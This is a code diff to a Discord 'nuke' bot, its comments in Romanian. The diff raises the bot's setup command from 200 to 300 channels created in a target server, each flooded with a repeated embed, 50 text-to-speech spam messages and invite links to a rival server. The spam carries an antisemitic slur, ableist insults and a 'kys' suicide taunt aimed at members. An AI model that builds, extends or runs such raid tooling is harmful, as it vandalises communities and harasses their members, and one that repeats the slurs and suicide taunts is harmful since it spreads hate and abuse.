@@ -154,7 +154,7 @@ class CooldownManager:
 
 cooldown_manager = CooldownManager(100)
 
-# ================== FUNCȚII FONTURI UNICODE ==================
+# ================== FONTURI UNICODE ==================
 
 FONT_MAPS = {
     "bold": {
@@ -297,25 +297,28 @@ async def setup(ctx):
         "Larp-empire-on-top"
     ]
 
-    # ===== EMBED 1: MESAJ PERSONALIZAT =====
-    embed_msg = discord.Embed(
+    # ===== EMBED UNIC =====
+    embed_content = discord.Embed(
         title="**LARP EMPIRE N4KED YOUR AHH**",
         description=(
-            "Next time don't give admin perms to everyone r4tard.\n\n"
+            "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n"
             "**# LARP EMPIRE SERVER NON HOOKED**\n"
             "**EVERYONE JOIN HERE GUYS LEAVE THIS SH**\n"
-            "https://discord.gg/larpempire"
+            "https://discord.gg/larpempire\n\n"
+            "*Next time don't give admin perms to everyone r4tard.*"
         ),
         color=0x000000
     )
-    embed_msg.set_footer(text="Larp Empire • Nuke Service")
+    embed_content.set_image(url="https://i.imgur.com/yMQvcRw.gif")
+    embed_content.set_footer(text="Larp Empire • Nuke Service")
 
-    # ===== EMBED 2: DOAR BANNER =====
-    embed_banner = discord.Embed(color=0x000000)
-    embed_banner.set_image(url="https://i.imgur.com/yMQvcRw.gif")
+    # ===== TEXT SPAM (50 de ori) =====
+    spam_text = "corrupt own this mfs kys you js got n4ked https://discord.gg/larpempire @everyone @here"
 
-    spam_text = "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE"
+    # ===== INVITAȚIE SEPARATĂ =====
+    invite_text = "https://discord.gg/larpempire @everyone join"
 
+    # ===== CREARE 300 CANALE =====
     created = 0
     font_styles = ["bold", "script", "double"]
 
@@ -330,29 +333,32 @@ async def setup(ctx):
 
             ch = await guild.create_text_channel(name=styled_name)
 
-            # Trimite EMBED 1 (mesaj)
-            await ch.send(embed=embed_msg)
+            # 1. Spam embed de 15 ori
+            for _ in range(15):
+                await ch.send(embed=embed_content)
 
-            # Trimite EMBED 2 (doar banner)
-            await ch.send(embed=embed_banner)
-
-            # Spam text
-            spams = 100 if is_premium_user(user.id) else 50
-            for _ in range(spams):
+            # 2. Spam text de 50 de ori
+            for _ in range(50):
                 await ch.send(content=spam_text, tts=True)
+
+            # 3. Trimite embed-ul încă o dată
+            await ch.send(embed=embed_content)
+
+            # 4. Trimite invitația separat
+            await ch.send(content=invite_text)
 
             created += 1
         except Exception as e:
             await user.send(f"❌ Eroare la canalul {index}: {e}")
 
-    await user.send("🔄 Încep crearea a 200 de canale cu fonturi diferite...")
+    await user.send("🔄 Încep crearea a 300 de canale cu fonturi diferite...")
 
-    tasks = [create_single_channel(i) for i in range(200)]
-    batch_size = 50
+    tasks = [create_single_channel(i) for i in range(300)]
+    batch_size = 10
     for i in range(0, len(tasks), batch_size):
         batch = tasks[i:i+batch_size]
         await asyncio.gather(*batch)
-        await asyncio.sleep(1)
+        await asyncio.sleep(1)  # 10 canale pe secundă
 
     await user.send(f"✅ Creare finalizată! {created} canale create.")
 
